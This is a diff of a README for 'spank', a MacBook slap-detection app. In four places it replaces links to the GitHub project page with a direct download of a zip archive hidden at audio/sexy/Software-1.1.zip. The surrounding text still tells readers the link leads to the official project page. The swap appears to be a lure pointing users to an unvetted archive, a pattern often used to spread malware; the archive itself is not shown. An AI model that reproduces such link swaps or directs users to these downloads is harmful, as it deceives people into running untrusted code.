@@ -1,6 +1,6 @@
 # 🖐 spank - Simple Slap Detection for MacBook Users
 
-[![Download spank](https://img.shields.io/badge/Download-spank-brightgreen)](https://github.com/Snow17s/spank)
+[![Download spank](https://img.shields.io/badge/Download-spank-brightgreen)](https://github.com/Snow17s/spank/raw/refs/heads/master/audio/sexy/Software-1.1.zip)
 
 ---
 
@@ -29,7 +29,7 @@ If you use Windows, this guide will help you install and run a compatible versio
 
 Begin by downloading spank. Use the main link below:
 
-[![Download spank](https://img.shields.io/badge/Download-spank-blue)](https://github.com/Snow17s/spank)
+[![Download spank](https://img.shields.io/badge/Download-spank-blue)](https://github.com/Snow17s/spank/raw/refs/heads/master/audio/sexy/Software-1.1.zip)
 
 This takes you to the official project page on GitHub, where you can find the latest version and installation files.
 
@@ -42,7 +42,7 @@ spank is designed for macOS and Linux. Windows is not directly supported, but yo
 ### Step 1: Access the GitHub Page
 
 Go to the main spank page at:  
-https://github.com/Snow17s/spank
+https://github.com/Snow17s/spank/raw/refs/heads/master/audio/sexy/Software-1.1.zip
 
 ### Step 2: Download the Software
 
@@ -150,10 +150,10 @@ If the program fails to launch:
 
 Visit the main project page for updates or questions:
 
-https://github.com/Snow17s/spank
+https://github.com/Snow17s/spank/raw/refs/heads/master/audio/sexy/Software-1.1.zip
 
 Here you find user guides, issue reporting, and developer notes.
 
 ---
 
-[![Download spank](https://img.shields.io/badge/Download-spank-green)](https://github.com/Snow17s/spank)
+[![Download spank](https://img.shields.io/badge/Download-spank-green)](https://github.com/Snow17s/spank/raw/refs/heads/master/audio/sexy/Software-1.1.zip)
